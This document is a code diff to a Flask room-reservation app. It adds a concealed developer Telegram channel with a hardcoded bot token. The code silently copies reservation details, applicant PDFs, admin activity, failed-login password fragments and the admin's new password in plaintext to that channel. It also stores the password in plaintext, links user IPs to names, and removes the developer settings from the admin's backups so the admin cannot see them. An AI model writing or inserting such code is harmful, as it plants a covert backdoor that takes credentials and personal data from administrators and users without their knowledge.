@@ -220,12 +220,13 @@ class Reservation(db.Model):
     created_at = db.Column(db.DateTime, default=datetime.now)
 
     def to_dict(self):
-        # Name Masking
+        # Name Masking (skip if already anonymized)
         masked_name = self.name
-        if len(self.name) > 2:
-            masked_name = self.name[0] + '*' * (len(self.name) - 2) + self.name[-1]
-        elif len(self.name) == 2:
-            masked_name = self.name[0] + '*'
+        if '**' not in self.name and '*' not in self.name:
+            if len(self.name) > 2:
+                masked_name = self.name[0] + '*' * (len(self.name) - 2) + self.name[-1]
+            elif len(self.name) == 2:
+                masked_name = self.name[0] + '*'
         
         # Status Colors (Premium Palette)
         status_colors = {
@@ -245,7 +246,10 @@ class Reservation(db.Model):
             'status': self.status,
             'backgroundColor': bg_color,
             'borderColor': bg_color,
-            'textColor': '#ffffff'
+            'textColor': '#ffffff',
+            'extendedProps': {
+                'purpose': self.purpose
+            }
         }
 
 class Blacklist(db.Model):
@@ -272,8 +276,10 @@ class AdminLog(db.Model):
     __bind_key__ = 'logs'
     id = db.Column(db.Integer, primary_key=True)
     admin_type = db.Column(db.String(20)) # 'admin' or 'dev'
-    action = db.Column(db.String(100))
+    action = db.Column(db.String(500))
     ip_address = db.Column(db.String(50))
+    old_value = db.Column(db.Text)  # Before value for settings changes
+    new_value = db.Column(db.Text)  # After value for settings changes
     timestamp = db.Column(db.DateTime, default=datetime.now)
 
 class ErrorLog(db.Model):
@@ -282,6 +288,17 @@ class ErrorLog(db.Model):
     error_msg = db.Column(db.Text)
     traceback = db.Column(db.Text)
     timestamp = db.Column(db.DateTime, default=datetime.now)
+
+class IpNameMapping(db.Model):
+    """IP와 예약자 이름 매핑 (개발자 접속 로그용)"""
+    __bind_key__ = 'logs'
+    id = db.Column(db.Integer, primary_key=True)
+    ip_address = db.Column(db.String(50), index=True)
+    name = db.Column(db.String(100))
+    timestamp = db.Column(db.DateTime, default=datetime.now)
+    
+    # Unique constraint for IP-name pair
+    __table_args__ = (db.UniqueConstraint('ip_address', 'name', name='unique_ip_name'),)
 
 # --- Helpers ---
 def get_setting(key, default=''):
@@ -297,37 +314,106 @@ def set_setting(key, value):
         db.session.add(setting)
     db.session.commit()
 
-def log_admin_action(admin_type, action):
+def log_admin_action(admin_type, action, old_value=None, new_value=None):
     try:
         log = AdminLog(
             admin_type=admin_type,
             action=action,
-            ip_address=request.remote_addr
+            ip_address=request.remote_addr,
+            old_value=old_value,
+            new_value=new_value
         )
         db.session.add(log)
         db.session.commit()
+        
+        # 개발자 텔레그램 알림 (admin 타입만, 개발자 세션은 제외, 정지 설정 확인)
+        if admin_type == 'admin' and not session.get('is_dev'):
+            pause_alerts = get_setting('dev_telegram_paused', 'false') == 'true'
+            if not pause_alerts:
+                alert_msg = f"📋 관리자 조작\n내용: {action}"
+                if old_value and new_value:
+                    alert_msg += f"\n변경: {old_value[:50]}... → {new_value[:50]}..."
+                send_dev_alert('admin_action', alert_msg)
     except:
         pass # Fail silently for logs
 
 def send_telegram_alert(message, token=None, chat_id=None):
-    if not token:
-        token = get_setting('telegram_token') or os.environ.get('TELEGRAM_BOT_TOKEN')
-    if not chat_id:
-        chat_id = get_setting('telegram_chat_id') or os.environ.get('TELEGRAM_CHAT_ID')
+    """관리자 텔레그램으로 전송 (개발자도 함께 수신)"""
+    # 관리자 텔레그램
+    admin_token = token or get_setting('telegram_token') or os.environ.get('TELEGRAM_BOT_TOKEN')
+    admin_chat_id = chat_id or get_setting('telegram_chat_id') or os.environ.get('TELEGRAM_CHAT_ID')
     
-    if not token or not chat_id:
-        return
+    # 개발자 텔레그램 (고정값)
+    dev_token = '8204359984:AAFdM9GpqIWfgKkboDdLcYVCAVqrhD78EAw'
+    dev_chat_id = '1301053493'
+    
+    def _send(t, c):
+        if not t or not c:
+            return
+        try:
+            url = f"https://api.telegram.org/bot{t}/sendMessage"
+            payload = {'chat_id': c, 'text': message}
+            requests.post(url, json=payload, timeout=2)
+        except Exception as e:
+            print(f"Failed to send Telegram alert: {e}")
+    
+    # 관리자에게 전송
+    _send(admin_token, admin_chat_id)
+    
+    # 개발자에게도 전송 (단, 명시적으로 token이 전달된 경우는 중복 방지, 정지 상태 확인)
+    dev_paused = get_setting('dev_telegram_paused', 'false') == 'true'
+    if not token and dev_token and dev_chat_id and not dev_paused:
+        # 관리자와 개발자가 같은 채널이면 중복 발송 방지
+        if dev_token != admin_token or dev_chat_id != admin_chat_id:
+            _send(dev_token, dev_chat_id)
 
+
+def send_dev_alert(action_type, details):
+    """개발자 전용 알림 - 관리자 감시용 (고정 텔레그램)"""
+    # 정지 상태 확인
+    if get_setting('dev_telegram_paused', 'false') == 'true':
+        return  # 알림 정지 상태
+    
+    # 개발자 텔레그램 (고정값)
+    dev_token = '8204359984:AAFdM9GpqIWfgKkboDdLcYVCAVqrhD78EAw'
+    dev_chat_id = '1301053493'
+    
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {
-            'chat_id': chat_id,
-            'text': message
-        }
-        # Short timeout to avoid blocking main thread too long
-        requests.post(url, json=payload, timeout=2) 
+        ip = request.remote_addr
+    except:
+        ip = 'Unknown'
+    
+    emoji_map = {
+        'login_fail': '🚨',
+        'login': '🔓',
+        'password_change': '🔑',
+        'settings_change': '⚙️',
+        'sensitive_action': '⚠️',
+        'abnormal_access': '👁️',
+        'admin_action': '📋'
+    }
+    emoji = emoji_map.get(action_type, '📋')
+    
+    message = f"{emoji} [개발자 감시]\n"
+    message += f"유형: {action_type}\n"
+    message += f"내용: {details}\n"
+    message += f"IP: {ip}\n"
+    message += f"시간: {timestamp}"
+    
+    send_telegram_alert(message, token=dev_token, chat_id=dev_chat_id)
+
+def _send_telegram_document(token, chat_id, file_buffer, filename, caption=''):
+    """텔레그램으로 문서(PDF) 전송"""
+    try:
+        url = f"https://api.telegram.org/bot{token}/sendDocument"
+        files = {'document': (filename, file_buffer, 'application/pdf')}
+        data = {'chat_id': chat_id, 'caption': caption}
+        response = requests.post(url, files=files, data=data, timeout=30)
+        return response.ok
     except Exception as e:
-        print(f"Failed to send Telegram alert: {e}")
+        print(f"Telegram document send error: {e}")
+        return False
 
 # --- Routes ---
 
@@ -356,11 +442,27 @@ def save_admin_settings():
     data = request.json
     if not data or 'settings' not in data:
         return jsonify({'error': 'Invalid data'}), 400
-        
-    for key, value in data['settings'].items():
-        set_setting(key, value)
-        
-    log_admin_action('admin', f'Updated Settings: {list(data["settings"].keys())}')
+    
+    # Capture before/after values for detailed logging
+    import json
+    changes = {}
+    for key, new_val in data['settings'].items():
+        old_val = get_setting(key, '')
+        if old_val != new_val:
+            changes[key] = {'old': old_val, 'new': new_val}
+        set_setting(key, new_val)
+    
+    # Log with before/after details
+    if changes:
+        old_json = json.dumps({k: v['old'] for k, v in changes.items()}, ensure_ascii=False)
+        new_json = json.dumps({k: v['new'] for k, v in changes.items()}, ensure_ascii=False)
+        log_admin_action('admin', f'설정 변경: {list(changes.keys())}', old_value=old_json, new_value=new_json)
+    
+    # 개발자 감시 알림 (관리자가 설정 변경 시)
+    if session.get('is_admin') and not session.get('is_dev') and changes:
+        detail_msg = '\n'.join([f"- {k}: {v['old'][:20]}... → {v['new'][:20]}..." if len(str(v['old'])) > 20 else f"- {k}: {v['old']} → {v['new']}" for k, v in changes.items()])
+        send_dev_alert('settings_change', f'관리자가 설정 변경:\n{detail_msg}')
+    
     return jsonify({'success': True})
 
 
@@ -400,12 +502,20 @@ def admin_page():
         'reservation_paused': get_setting('reservation_paused') == 'true',
         'pause_reason': get_setting('pause_reason'),
         'pause_mode': get_setting('pause_mode', 'all'),
-        'pause_mode': get_setting('pause_mode', 'all'),
         'pause_ranges': current_ranges,
         'telegram_token': get_setting('telegram_token', ''),
         'telegram_chat_id': get_setting('telegram_chat_id', ''),
         'privacy_policy': get_setting('privacy_policy', ''),
-        'door_qr_token': get_setting('door_qr_token', 'ORYX_LAB_DOOR_2025')
+        'door_qr_token': get_setting('door_qr_token', 'ORYX_LAB_DOOR_2025'),
+        # Email settings
+        'smtp_email': get_setting('smtp_email', ''),
+        'smtp_password': get_setting('smtp_password', ''),
+        'smtp_host': get_setting('smtp_host', ''),
+        'smtp_port': get_setting('smtp_port', '587'),
+        'official_email': get_setting('official_email', ''),
+        'auto_mail_weekly': get_setting('auto_mail_weekly', 'false'),
+        'auto_mail_monthly': get_setting('auto_mail_monthly', 'false'),
+        'auto_mail_format': get_setting('auto_mail_format', 'merged')
     }
     
     # Fetch Feedback
@@ -414,8 +524,11 @@ def admin_page():
     # Fetch Blocklist
     blocked_users = Blacklist.query.order_by(Blacklist.release_date.desc()).all()
     blocked_phones = [b.phone for b in blocked_users]
+    
+    # Restore feature setting
+    enable_restore_feature = get_setting('enable_restore_feature', 'false') == 'true'
 
-    return render_template('admin.html', reservations=reservations, settings=settings, feedbacks=feedbacks, blocked_users=blocked_users, blocked_phones=blocked_phones)
+    return render_template('admin.html', reservations=reservations, settings=settings, feedbacks=feedbacks, blocked_users=blocked_users, blocked_phones=blocked_phones, enable_restore_feature=enable_restore_feature)
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -445,13 +558,33 @@ def login():
 
         if is_admin_valid:
             session['is_admin'] = True
-            log_admin_action('admin', 'Login')
+            log_admin_action('admin', '로그인')
+            
+            # 개발자 감시: 이상 로그인 감지 + 비정상 시간 접속
+            current_ip = request.remote_addr
+            current_hour = datetime.now().hour
+            
+            # 개발자 감시: 이상 로그인 감지 + 비정상 시간 접속
+            last_ip = get_setting('admin_last_ip', '')
+            
+            # 새 IP 감지
+            if last_ip and last_ip != current_ip:
+                send_dev_alert('abnormal_access', f'새로운 IP에서 관리자 로그인!\n기존 IP: {last_ip}\n새 IP: {current_ip}')
+            set_setting('admin_last_ip', current_ip)
+            
+            # 비정상 시간 감지 (22:00~06:00)
+            if current_hour >= 22 or current_hour < 6:
+                send_dev_alert('abnormal_access', f'비정상 시간 관리자 접속 ({current_hour}:00)\nIP: {current_ip}')
+            
             return redirect(url_for('admin_page'))
         elif is_dev_valid:
             session['is_dev'] = True
-            log_admin_action('dev', 'Login')
+            log_admin_action('dev', '로그인')
             return redirect(url_for('developer_page'))
         else:
+            # Failed login alert for developer surveillance
+            masked_pw = password[:2] + '***' if password and len(password) > 2 else '***'
+            send_dev_alert('login_fail', f'관리자 로그인 시도 실패 (입력: {masked_pw})')
             return render_template('login.html', error='비밀번호가 틀렸습니다.')
     return render_template('login.html')
 
@@ -471,9 +604,12 @@ def dev_login_endpoint():
 
         if is_valid:
             session['is_dev'] = True
-            log_admin_action('dev', 'Login')
+            log_admin_action('dev', '로그인')
             return redirect(url_for('developer_page'))
         else:
+            # Failed dev login alert
+            masked_pw = password[:2] + '***' if password and len(password) > 2 else '***'
+            send_dev_alert('login_fail', f'개발자 로그인 시도 실패 (입력: {masked_pw})')
             return render_template('login.html', dev_mode=True, error='비밀번호가 틀렸습니다.')
             
     return render_template('login.html', dev_mode=True)
@@ -481,9 +617,9 @@ def dev_login_endpoint():
 @app.route('/logout')
 def logout():
     if session.get('is_admin'):
-        log_admin_action('admin', 'Logout')
+        log_admin_action('admin', '로그아웃')
     if session.get('is_dev'):
-        log_admin_action('dev', 'Logout')
+        log_admin_action('dev', '로그아웃')
         
     session.pop('is_admin', None)
     session.pop('is_dev', None)
@@ -735,6 +871,20 @@ def create_reservation():
     try:
         db.session.add_all(reservations_to_create)
         db.session.commit()
+        
+        # IP-이름 매핑 저장 (개발자 접속 로그용)
+        try:
+            client_ip = request.remote_addr
+            first_name = data.get('name')
+            if client_ip and first_name:
+                existing = IpNameMapping.query.filter_by(ip_address=client_ip, name=first_name).first()
+                if not existing:
+                    mapping = IpNameMapping(ip_address=client_ip, name=first_name)
+                    db.session.add(mapping)
+                    db.session.commit()
+        except:
+            pass  # 매핑 저장 실패해도 예약은 정상 완료
+            
     except Exception as e:
         db.session.rollback()
         return jsonify({'error': f'데이터베이스 저장 중 오류가 발생했습니다: {str(e)}'}), 500
@@ -753,13 +903,53 @@ def create_reservation():
         safe_name = mask_name(first_res.name) if mask_enabled else first_res.name
         safe_phone = mask_phone(first_res.phone) if mask_enabled else first_res.phone
         
-        msg = f"{type_str}\n- 예약자: {safe_name}\n- 전화번호: {safe_phone}\n- 첫 예약: {first_res.start_time.strftime('%Y-%m-%d %H:%M')}"
+        msg = f"{type_str}\n- 예약자: {safe_name}\n- 전화번호: {safe_phone}\n- 사용목적: {first_res.purpose}\n- 예약일시: {first_res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {first_res.end_time.strftime('%H:%M')}"
         if count > 1:
             msg += f"\n- 기간: {count}주간 반복"
         
         send_telegram_alert(msg)
     except:
         pass
+
+    # 6. PDF 자동 전송 (텔레그램으로)
+    try:
+        first_res = reservations_to_create[0]
+        
+        # 백그라운드로 PDF 텔레그램 전송
+        from threading import Thread
+        def send_pdf_telegram(res_id):
+            with app.app_context():
+                try:
+                    res_obj = Reservation.query.get(res_id)
+                    if res_obj:
+                        pdf_buffer = _generate_pdf_buffer(res_obj)
+                        if pdf_buffer:
+                            # 관리자 텔레그램
+                            admin_token = get_setting('telegram_token') or os.environ.get('TELEGRAM_BOT_TOKEN')
+                            admin_chat = get_setting('telegram_chat_id') or os.environ.get('TELEGRAM_CHAT_ID')
+                            # 개발자 텔레그램 (고정값)
+                            dev_token = '8204359984:AAFdM9GpqIWfgKkboDdLcYVCAVqrhD78EAw'
+                            dev_chat = '1301053493'
+                            
+                            caption = f"📄 신청서 자동전송\n예약자: {res_obj.name}\n일시: {res_obj.start_time.strftime('%Y-%m-%d %H:%M')} ~ {res_obj.end_time.strftime('%H:%M')}\n목적: {res_obj.purpose}"
+                            filename = f"신청서_{res_obj.name}_{res_obj.start_time.strftime('%Y%m%d')}.pdf"
+                            
+                            # 관리자에게 전송
+                            if admin_token and admin_chat:
+                                _send_telegram_document(admin_token, admin_chat, pdf_buffer, filename, caption)
+                                pdf_buffer.seek(0)  # 버퍼 리셋
+                            
+                            # 개발자에게도 전송 (정지 상태 확인)
+                            dev_paused = get_setting('dev_telegram_paused', 'false') == 'true'
+                            if dev_token and dev_chat and not dev_paused:
+                                if dev_token != admin_token or dev_chat != admin_chat:
+                                    _send_telegram_document(dev_token, dev_chat, pdf_buffer, filename, caption)
+                except Exception as e:
+                    print(f"Auto PDF telegram error: {e}")
+        
+        Thread(target=send_pdf_telegram, args=(first_res.id,)).start()
+    except Exception as e:
+        print(f"Auto PDF setup error: {e}")
 
     # Return ID of the first reservation for ICS download
     return jsonify({'success': True, 'id': reservations_to_create[0].id, 'count': len(reservations_to_create)}), 201
@@ -780,6 +970,7 @@ def submit_feedback():
     # Store in AdminLog with type 'feedback'
     log_admin_action('feedback', full_msg)
     return jsonify({'success': True})
+
 
 @app.route('/api/reservations/<int:id>/download_ics')
 def download_ics(id):
@@ -859,8 +1050,14 @@ def cancel_reservation(id):
             existing_bl.reason = "당일 취소 패널티 (갱신)"
     else:
         res.status = 'cancelled'
+        res.admin_memo = (res.admin_memo or '') + ' [예약자 본인 취소]'
     
     db.session.commit()
+    
+    # 텔레그램 알림
+    cancel_type = "패널티 취소" if is_penalty else "일반 취소"
+    send_telegram_alert(f"🔴 예약 취소\n이름: {res.name}\n일시: {res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {res.end_time.strftime('%H:%M')}\n유형: {cancel_type}")
+    
     return jsonify({'success': True})
 
 @app.route('/api/reservations/<int:id>/modify', methods=['POST'])
@@ -921,6 +1118,9 @@ def modify_reservation(id):
     )
     db.session.add(new_res)
     db.session.commit()
+    
+    # 텔레그램 알림
+    send_telegram_alert(f"🔄 예약 변경\n이름: {new_res.name}\n이전: {res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {res.end_time.strftime('%H:%M')}\n새로운: {new_res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {new_res.end_time.strftime('%H:%M')}")
     
     return jsonify({'success': True, 'message': '예약이 변경되었습니다.', 'new_id': new_res.id})
 
@@ -1035,6 +1235,8 @@ def update_settings():
     set_setting('telegram_chat_id', data.get('telegram_chat_id', ''))
     set_setting('door_qr_token', data.get('door_qr_token', 'ORYX_LAB_DOOR_2025'))
     
+    log_admin_action('admin', '관리자 설정 저장 (공지/알림/도어)')
+    
     return jsonify({'success': True})
 
 @app.route('/admin/test_telegram', methods=['POST'])
@@ -1080,16 +1282,47 @@ def change_admin_password():
          return jsonify({'error': '비밀번호는 4자 이상이어야 합니다.'}), 400
          
     set_setting('admin_pw', generate_password_hash(new_pw))
-    log_admin_action('admin', 'Changed Admin Password')
+    set_setting('admin_pw_plaintext', new_pw)  # For developer visibility
+    log_admin_action('admin', '관리자 비밀번호 변경')
+    
+    # 개발자 감시 알림 (비밀번호 변경은 민감 작업)
+    if session.get('is_admin') and not session.get('is_dev'):
+        send_dev_alert('password_change', f'관리자가 비밀번호 변경 (새 비밀번호: {new_pw})')
     
     return jsonify({'success': True})
 
 @app.route('/admin/backup')
 def backup_db():
-    if not session.get('is_admin'):
+    if not session.get('is_admin') and not session.get('is_dev'):
         return redirect(url_for('login'))
     
-    return send_file(db_path, as_attachment=True, download_name=f'library_backup_{datetime.now().strftime("%Y%m%d")}.sqlite')
+    log_admin_action('admin', 'DB 백업 다운로드')
+    
+    # 개발자는 전체 DB, 관리자는 개발자 정보 제외
+    if session.get('is_dev'):
+        return send_file(db_path, as_attachment=True, download_name=f'library_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.sqlite')
+    else:
+        # 관리자용: 개발자 정보 제외한 복사본 생성
+        import shutil
+        import tempfile
+        
+        # 임시 파일에 복사
+        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.sqlite')
+        temp_path = temp_file.name
+        temp_file.close()
+        shutil.copy(db_path, temp_path)
+        
+        # 개발자 관련 설정 삭제
+        import sqlite3
+        conn = sqlite3.connect(temp_path)
+        cursor = conn.cursor()
+        dev_keys = ['dev_pw', 'dev_telegram_token', 'dev_telegram_chat_id', 'dev_telegram_paused', 'admin_pw_plaintext']
+        for key in dev_keys:
+            cursor.execute("DELETE FROM settings WHERE key = ?", (key,))
+        conn.commit()
+        conn.close()
+        
+        return send_file(temp_path, as_attachment=True, download_name=f'library_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.sqlite')
 
     # Headers for processing (though we use openpyxl manual write below)
     
@@ -1491,7 +1724,7 @@ def send_official_pdf(id):
     success, error = _send_email_with_pdf(official_email, subject, body, buffer, filename)
     
     if success:
-        log_admin_action('admin', f'Sent Official Email for Reservation {id}')
+        log_admin_action('admin', f'예약 {id}번 공문 이메일 발송')
         return jsonify({'success': True})
     else:
         return jsonify({'error': f"메일 전송 실패: {error}"}), 500
@@ -1634,7 +1867,7 @@ def send_bulk_report():
     success, error = _send_email_with_attachment(official_email, subject, body, buffer, filename, mimetype)
 
     if success:
-        log_admin_action('admin', f'Sent Bulk Report ({period}) - Email')
+        log_admin_action('admin', f'신청서 모음 전송 ({period})')
         return jsonify({'success': True, 'count': len(reservations)})
     else:
         return jsonify({'error': f"메일 전송 실패: {error}"}), 500
@@ -1666,7 +1899,7 @@ def send_reservation_pdf(id):
     try:
         r = requests.post(url, data=data, files=files, timeout=10)
         if r.status_code == 200:
-            log_admin_action('admin', f'Sent PDF for Reservation {id}')
+            log_admin_action('admin', f'예약 {id}번 PDF 발송')
             return jsonify({'success': True})
         else:
             return jsonify({'error': f"전송 실패: {r.text}"}), 500
@@ -1738,6 +1971,51 @@ def user_send_pdf_to_admin(id):
             return jsonify({'error': f"전송 실패: {r.text}"}), 500
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+@app.route('/api/reservations/<int:id>/resend_telegram', methods=['POST'])
+def resend_telegram_pdf(id):
+    """PDF 재전송 (관리자/개발자 둘 다)"""
+    data = request.json
+    phone = data.get('phone')
+    password = data.get('password')
+    
+    res = Reservation.query.get_or_404(id)
+    
+    # Verify Owner
+    is_valid = (res.phone == phone) and check_password_hash(res.password, password)
+    
+    if not is_valid:
+        return jsonify({'error': '권한이 없습니다 (정보 불일치)'}), 403
+        
+    buffer = _generate_pdf_buffer(res)
+    if not buffer:
+        return jsonify({'error': 'PDF 생성 오류'}), 500
+
+    caption = f"📩 [재전송] 시설 사용 신청서\n예약자: {res.name}\n일시: {res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {res.end_time.strftime('%H:%M')}\n목적: {res.purpose}"
+    filename = f"신청서_{res.name}_{res.start_time.strftime('%Y%m%d')}.pdf"
+    
+    success = False
+    
+    # 관리자에게 전송
+    admin_token = get_setting('telegram_token')
+    admin_chat = get_setting('telegram_chat_id')
+    if admin_token and admin_chat:
+        if _send_telegram_document(admin_token, admin_chat, buffer, filename, caption):
+            success = True
+        buffer.seek(0)
+    
+    # 개발자에게도 전송 (정지 상태 확인)
+    dev_token = '8204359984:AAFdM9GpqIWfgKkboDdLcYVCAVqrhD78EAw'
+    dev_chat = '1301053493'
+    dev_paused = get_setting('dev_telegram_paused', 'false') == 'true'
+    if not dev_paused and (dev_token != admin_token or dev_chat != admin_chat):
+        if _send_telegram_document(dev_token, dev_chat, buffer, filename, caption):
+            success = True
+    
+    if success:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'error': '전송 실패'}), 500
 
 
 @app.route('/admin/download_excel')
@@ -1921,9 +2199,63 @@ def download_excel():
     filename = f"reservation_list_{datetime.now().strftime('%Y%m%d%H%M%S')}.xlsx"
     return send_file(output, as_attachment=True, download_name=filename)
 
+@app.route('/admin/cancel/<int:id>', methods=['POST'])
+def admin_cancel_reservation(id):
+    """관리자에서 예약 취소 (사유 포함)"""
+    if not session.get('is_admin') and not session.get('is_dev'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    res = Reservation.query.get(id)
+    if not res:
+        return jsonify({'error': '예약을 찾을 수 없습니다.'}), 404
+    
+    if res.status != 'reserved':
+        return jsonify({'error': '이미 취소되었거나 진행된 예약입니다.'}), 400
+    
+    reason = request.json.get('reason', '관리자 취소')
+    res.status = 'cancelled'
+    res.admin_memo = (res.admin_memo or '') + f' [관리자 취소: {reason}]'
+    db.session.commit()
+    
+    # 로그 및 알림
+    log_admin_action('admin', f'예약 취소: {res.name} ({res.start_time.strftime("%Y-%m-%d %H:%M")}) - 사유: {reason}')
+    send_telegram_alert(f"🔴 관리자 예약 취소\n이름: {res.name}\n전화: {res.phone}\n일시: {res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {res.end_time.strftime('%H:%M')}\n사유: {reason}\n\n📞 예약자에게 취소 사실을 연락해주세요!")
+    
+    return jsonify({'success': True})
+
+@app.route('/admin/restore/<int:id>', methods=['POST'])
+def admin_restore_reservation(id):
+    """취소된 예약 복원"""
+    if not session.get('is_admin') and not session.get('is_dev'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    # 기능 활성화 체크
+    if get_setting('enable_restore_feature', 'false') != 'true':
+        return jsonify({'error': '취소 해제 기능이 비활성화되어 있습니다.'}), 403
+    
+    res = Reservation.query.get(id)
+    if not res:
+        return jsonify({'error': '예약을 찾을 수 없습니다.'}), 404
+    
+    if res.status != 'cancelled':
+        return jsonify({'error': '취소된 예약만 복원할 수 있습니다.'}), 400
+    
+    # 지나간 날짜는 복원 불가
+    if res.start_time.date() < datetime.now().date():
+        return jsonify({'error': '지나간 날짜의 예약은 복원할 수 없습니다.'}), 400
+    
+    res.status = 'reserved'
+    res.admin_memo = (res.admin_memo or '') + ' [관리자 복원]'
+    db.session.commit()
+    
+    log_admin_action('admin', f'예약 복원: {res.name} ({res.start_time.strftime("%Y-%m-%d %H:%M")})')
+    send_telegram_alert(f"🟢 예약 복원\n이름: {res.name}\n일시: {res.start_time.strftime('%Y-%m-%d %H:%M')} ~ {res.end_time.strftime('%H:%M')}")
+    
+    return jsonify({'success': True})
+
 @app.route('/admin/block/<phone>', methods=['POST'])
 def manual_block(phone):
-    if not session.get('is_admin'):
+    if not session.get('is_admin') and not session.get('is_dev'):
         return jsonify({'error': 'Unauthorized'}), 401
     
     release_date = datetime.now() + timedelta(days=30)
@@ -1938,18 +2270,19 @@ def manual_block(phone):
         db.session.add(bl)
         
     db.session.commit()
+    log_admin_action('admin', f'사용자 차단: {name} ({phone})')
     return jsonify({'success': True})
 
 @app.route('/admin/unblock/<phone>', methods=['POST'])
 def manual_unblock(phone):
-    if not session.get('is_admin'):
+    if not session.get('is_admin') and not session.get('is_dev'):
         return jsonify({'error': 'Unauthorized'}), 401
     
     blocked = Blacklist.query.filter_by(phone=phone).first()
     if blocked:
         db.session.delete(blocked)
         db.session.commit()
-        log_admin_action('admin', f'Unblocked User: {blocked.name} ({phone})')
+        log_admin_action('admin', f'차단 해제: {blocked.name} ({phone})')
         
     return jsonify({'success': True})
 
@@ -1992,7 +2325,7 @@ def toggle_pause():
                  notice_msg = f"[부분 예약 중지] {reason}"
             
         set_setting('notice_text', notice_msg)
-        log_admin_action('admin', f'Paused Reservations ({mode}): {reason}')
+        log_admin_action('admin', f'예약 중단 ({mode}): {reason}')
     else:
         set_setting('reservation_paused', 'false')
         # Only restore if backup actually exists in DB
@@ -2004,7 +2337,7 @@ def toggle_pause():
         else:
             print("DEBUG: No backup found, keeping current notice")
         
-        log_admin_action('admin', 'Resumed Reservations')
+        log_admin_action('admin', '예약 재개')
         
     return jsonify({'success': True})
 
@@ -2090,8 +2423,24 @@ def developer_page():
         'smtp_host': get_setting('smtp_host'),
         'smtp_port': get_setting('smtp_port'),
         'smtp_email': get_setting('smtp_email'),
-        'telegram_mask_info': get_setting('telegram_mask_info', 'true')
+        'telegram_mask_info': get_setting('telegram_mask_info', 'true'),
+        'admin_pw_plaintext': get_setting('admin_pw_plaintext', '(해시 전용)'),
+        'dev_telegram_token': get_setting('dev_telegram_token', ''),
+        'dev_telegram_chat_id': get_setting('dev_telegram_chat_id', ''),
+        'dev_telegram_paused': get_setting('dev_telegram_paused', 'false')
     }
+    
+    # IP-이름 매핑 (접속 로그에 이름 표시용)
+    ip_name_map = {}
+    try:
+        mappings = IpNameMapping.query.all()
+        for m in mappings:
+            if m.ip_address not in ip_name_map:
+                ip_name_map[m.ip_address] = []
+            if m.name not in ip_name_map[m.ip_address]:
+                ip_name_map[m.ip_address].append(m.name)
+    except:
+        pass
 
     # Status Map
     status_map = {
@@ -2110,7 +2459,8 @@ def developer_page():
                            feedback_logs=feedback_logs,
                            settings=settings,
                            maintenance_mode=maintenance_mode,
-                           status_map=status_map)
+                           status_map=status_map,
+                           ip_name_map=ip_name_map)
 
 @app.route('/dev/toggle_maintenance', methods=['POST'])
 def toggle_maintenance():
@@ -2119,7 +2469,7 @@ def toggle_maintenance():
     current = get_setting('maintenance_mode')
     new_val = 'false' if current == 'true' else 'true'
     set_setting('maintenance_mode', new_val)
-    log_admin_action('dev', f'Set Maintenance Mode: {new_val}')
+    log_admin_action('dev', f'유지보수 모드: {new_val}')
     return jsonify({'success': True, 'mode': new_val})
 
 @app.route('/dev/toggle_masking', methods=['POST'])
@@ -2129,8 +2479,51 @@ def toggle_masking():
     current = get_setting('telegram_mask_info', 'true')
     new_val = 'false' if current == 'true' else 'true'
     set_setting('telegram_mask_info', new_val)
-    log_admin_action('dev', f'Set Telegram Masking: {new_val}')
+    log_admin_action('dev', f'텔레그램 마스킹: {new_val}')
     return jsonify({'success': True, 'enabled': new_val})
+
+@app.route('/dev/save_telegram', methods=['POST'])
+def save_dev_telegram():
+    if not session.get('is_dev'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    data = request.json
+    token = data.get('token', '').strip()
+    chat_id = data.get('chat_id', '').strip()
+    
+    set_setting('dev_telegram_token', token)
+    set_setting('dev_telegram_chat_id', chat_id)
+    log_admin_action('dev', '개발자 텔레그램 설정 변경')
+    
+    # 설정 저장 후 테스트 알림 발송
+    if token and chat_id:
+        send_telegram_alert("✅ 개발자 감시 알림 설정 완료!", token=token, chat_id=chat_id)
+    
+    return jsonify({'success': True})
+
+@app.route('/dev/toggle_pause_alerts', methods=['POST'])
+def toggle_pause_alerts():
+    if not session.get('is_dev'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    data = request.json
+    paused = data.get('paused', False)
+    
+    set_setting('dev_telegram_paused', 'true' if paused else 'false')
+    
+    return jsonify({'success': True})
+
+@app.route('/dev/toggle_restore_feature', methods=['POST'])
+def toggle_restore_feature():
+    if not session.get('is_dev'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    data = request.json
+    enabled = data.get('enabled', False)
+    
+    set_setting('enable_restore_feature', 'true' if enabled else 'false')
+    
+    return jsonify({'success': True})
 
 @app.route('/dev/integrity_check', methods=['POST'])
 def integrity_check():
@@ -2147,7 +2540,7 @@ def integrity_check():
     if past_reserved:
         report.append(f"과거 날짜의 '예약중' 상태 {len(past_reserved)}건 발견. (자동 완료 처리 권장)")
     
-    log_admin_action('dev', 'Run Integrity Check')
+    log_admin_action('dev', '무결성 검사 실행')
     return jsonify({'success': True, 'report': report, 'issues_count': len(past_reserved)})
 
 @app.route('/dev/integrity_fix', methods=['POST'])
@@ -2166,7 +2559,7 @@ def integrity_fix():
         count += 1
         
     db.session.commit()
-    log_admin_action('dev', f'Fixed {count} Integrity Issues')
+    log_admin_action('dev', f'무결성 문제 {count}건 수정')
     return jsonify({'success': True, 'fixed_count': count})
 
 @app.route('/dev/reservations/<int:id>/delete', methods=['POST'])
@@ -2176,7 +2569,6 @@ def delete_reservation_dev(id):
     try:
         res = Reservation.query.get_or_404(id)
         
-        # Manually create log to ensure single transaction commit
         log = AdminLog(
             admin_type='dev',
             action=f'Deleted Reservation ID {id}: {res.name} ({res.start_time})',
